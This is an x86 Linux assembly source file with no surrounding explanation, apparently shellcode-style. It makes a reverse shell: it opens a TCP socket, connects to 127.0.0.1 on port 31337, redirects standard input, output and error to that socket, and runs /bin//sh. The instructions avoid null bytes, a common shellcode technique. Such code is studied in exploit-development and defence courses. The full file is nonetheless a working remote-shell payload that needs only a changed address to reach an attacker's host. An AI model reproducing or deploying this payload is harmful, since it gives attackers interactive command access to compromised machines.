.global _main
.section .text

_main:

# prepare the stack
push	%ebp
mov	%esp,%ebp
sub	$64,%esp

# parameters for socket(2)
xor	%eax,%eax
mov	$2,%al
mov	%al,-12(%ebp) # AF_INET
xor	%eax,%eax
mov	$1,%al
mov	%al,-8(%ebp) # SOCK_STREAM
xor	%eax,%eax
mov	%eax,-4(%ebp) # IPPROTO_IP

# invoke socketcall for socket(2)
xor	%eax,%eax
mov	$0x66,%al # socketcall
xor	%ebx,%ebx
mov	$1,%bl # socket
lea	-12(%ebp),%ecx # address of parameter array
int	$0x80

# save socket file descriptor
mov	%eax,%edi

# parameters for connect(3)
xor	%eax,%eax
mov	$2,%al
mov	%al,-12(%ebp) # AF_INET
mov	$-16777344,%eax
not	%eax
mov	%eax,-8(%ebp) # host: 127.0.0.1 (16777343)
mov	$0x697a,%ax
mov	%ax,-10(%ebp) # port: 31337 (27002)

mov	%edi,-24(%ebp) # sockfd
lea	-12(%ebp),%eax
mov	%eax,-20(%ebp) # &sockaddr
xor	%eax,%eax
mov	$0x10,%al
mov	%eax,-16(%ebp) # addrlen

# invoke socketcall for connect(3)
xor	%eax,%eax
mov	$0x66,%al # socketcall
xor	%ebx,%ebx
mov	$3,%bl # connect
lea	-24(%ebp),%ecx # address of parameter array
int	$0x80

# redirect stdin/stdout/stderr
xor	%eax,%eax
mov	$0x3f,%al # sys_dup2
mov	%edi,%ebx # sockfd
xor	%ecx,%ecx # stdin
int	$0x80

xor	%eax,%eax
mov	$0x3f,%al # sys_dup2
mov	%edi,%ebx # sockfd
xor	%ecx,%ecx
mov	$1,%cl # stdout
int	$0x80

xor	%eax,%eax
mov	$0x3f,%al # sys_dup2
mov	%edi,%ebx #sockfd
xor	%ecx,%ecx
mov	$2,%cl # stderr
int	$0x80

# execute "/bin//sh"
push	$0x68732f2f
push	$0x6e69622f
mov	%esp,%ebx
xor	%ecx,%ecx
xor	%edx,%edx
xor	%eax,%eax
mov	$0xb,%al
int	$0x80

leave
ret
